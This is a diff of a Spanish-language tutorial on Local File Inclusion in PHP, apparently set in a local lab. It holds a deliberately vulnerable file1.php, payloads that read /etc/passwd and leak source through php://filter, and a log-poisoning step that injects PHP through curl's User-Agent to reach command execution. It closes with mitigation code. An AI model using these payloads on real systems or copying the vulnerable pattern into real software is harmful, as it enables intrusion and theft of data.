@@ -56,25 +56,43 @@ $page[ 'body' ] .= "
 ?>
 
 ~~~
+
 Este archivo nos muestra para hacer click en dos elementos que nos llevan a dos páginas diferentes: file1.php y file2.php con el siguiente contenido
 
+![](Images/img1.png)
 
 file1.php
 ~~~
 <?php
 
-$file[ 'body' ] .= "
-<div class=\"body_padded\">
-        <h1>Vulnerability: File Inclusion</h1>
-        <div class=\"vulnerable_code_area\">
-                <h3>File 1</h3>
-                Hola  tio, esto es el archivo 1
-        </div>
-</div>
+if (isset($_GET['file'])) {
+    $file = $_GET['file'];
+    echo file_get_contents($file);
+}
+
+?>
+
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Ejemplo de Enlaces</title>
+</head>
+<body>
+    <h1>Elige un archivo</h1>
+    <ul>
+        <li><a href="?file=file1.php">Archivo 1</a></li>
+        <li><a href="?file=file2.php">Archivo 2</a></li>
+    </ul>
+</body>
+</html>
 
 ?>
 
 ~~~
+
+![](Images/img2.png)
+
 Esta página simplemente nos muestra un mensaja, al igual que el siguiente:
 
 El archivo file2.php tiene el siguiente contenido: 
@@ -95,12 +113,15 @@ $file[ 'body' ] .= "
 ?>
 ~~~
 
+![](Images/img3.png)
+
 Al pulsar en los enlaces nos muestra el contenido de los archivos
 
-![](images/lfi1.png)
+![](Images/img4.png)
 
 
-![](images/lfi2.png)
+![](Images/img5.png)
+
 
 ## Explotación de LFI
 ---
@@ -113,14 +134,14 @@ Prueba básica: Para saber si una página es vulnerable a LFI y teniendo en cuen
 Si ponemos la ruta de /etc/passwd podemos intentar ver los datos de usuarios del sistema.
 
 ~~~
-http://localhost/lfi.php?file=../../../../etc/passwd
+http://localhost/LFI/lfi.php?file=/etc/passwd
 ~~~
 
-Si devuelve similar a:
+En en caso que nos devuelva algo similar a la siguiente captura:
 
-![](images/lfi3.png)
- 
-La aplicación es vulnerable a LFI.
+![](Images/img6.png)
+
+Significa que la aplicación es vulnerable a LFI:
 
 **Ejecutar código PHP (PHP Wrappers)**
 ---
@@ -142,11 +163,15 @@ y editamos el archivo de configuración de php. Recordamos que en nuestro conten
 nano /usr/local/etc/php/php.ini
 ~~~
 
-y ponermos la variable allow_url_include a on. Aquí tienes el [php.ini](files/php.ini.lfi) para hacer las pruebas.
+![](Images/img7.png)
+
+A continuación, ponermos la variable allow_url_include a on. Aquí tienes el [php.ini](files/php.ini.lfi) para hacer las pruebas.
 
 ~~~
 allow_url_include=on
 ~~~
+
+![](Images/img8.png)
 
 Después reiniciamos el servicio.
 
@@ -154,16 +179,15 @@ Después reiniciamos el servicio.
 Vamos a realizar el ataque, para ver si podemos ejecutar php en el servidor y así obtener el código del archivo index.html
 
 ~~~
-http://localhost/lfi.php?file=php://filter/convert.base64-encode/resource=index.html
+http://localhost/LFI/lfi.php?file=php://filter/convert.base64-encode/resource=lfi.php
 ~~~
-
 
 - file= → Se usa un parámetro vulnerable en lfi.php que permite incluir archivos arbitrarios en el servidor.php://filter/convert.base64-encode/resource=index.html:
 - php://filter → Es un wrapper especial de PHP que permite aplicar filtros de manipulación de datos.
 	- convert.base64-encode → Codifica el contenido del archivo en Base64 en lugar de mostrarlo directamente.
 	- resource=index.html → Especifica el archivo que se quiere leer, en este caso index.html.
 
-![](images/lfi4.png)
+![](Images/img9.png)
 
 **Decodificar la cadena en Base64 y mostrar el resultado:**
 
@@ -173,7 +197,7 @@ Copiamos la cadena que hemos obtenido y realizamos la decodificación:
 echo "BASE64_ENCODED_DATA" | base64 -d
 ~~~
 
-![](images/lfi5.png)
+![](Images/img10.png)
 
 De esta forma hemos obtenido el contenido de un archivo que no debería de ser accesible. Es posible que podamos encontrar en este u otro archivo un comentario con la contraseña, el código funte, etc....
 
@@ -186,23 +210,26 @@ Enviar payload en User-Agent (inyectar en logs de Apache). Ejecutamos en un term
 ~~~
 curl -A "<?php system('whoami'); ?>" http://localhost
 ~~~
+
 Esto intenta ejecutar el código php para solicitar el usuario que está ejecutando el servidor de localhost. El resultado de la información "whoami" irá a los logs de apache2.
+
+![](Images/img11.png)
 
 Hacemos un LFI para  Incluir el log, y así poder recuperar el resultado del comando ejecutado:
 
-![](images/lfi7.png)
-
 ~~~
-http://localhost/lfi.php?file=/var/log/apache2/access.log
+http://localhost/LFI/lfi.php?file=/var/log/apache2/access.log
 ~~~
 
 o si lo tenemos en la pila LAMP de docker en:
 
 ~~~
-http://localhost/lfi.php?file=/var/log/apache2/other_vhosts_access.log
+http://localhost/LFI/lfi.php?file=/var/log/apache2/other_vhosts_access.log
 ~~~
 
 Si se muestra el resultado de **whoami**, LFI ha escalado a la ejecución de comandos (RCE).
+
+![](Images/img12.png)
 
 ### Mitigación de LFI
 ---
@@ -241,16 +268,18 @@ if (isset($_GET['file'])) {
 </html>
 ~~~
 
+![](Images/img13.png)
+
 Si intentamos incluir cualquier otro archivo nos dá acceso denegado:
  
-![](images/lfi8.png)
+![](Images/img14.png)
 
 **Bloquear Secuencias de Directorios (../)**
 ---
 Con *str_contains* verificamos si el nombre del archivo contiene ".." y denegaríamos el acceso. 
 
 ~~~
-?php
+<?php
 
 if (isset($_GET['file'])) {
     $file = $_GET['file'];
@@ -279,6 +308,8 @@ if (isset($_GET['file'])) {
 </body>
 </html>
 ~~~
+
+![](Images/img15.png)
 
 **Restringir el Tipo de Archivo**
 
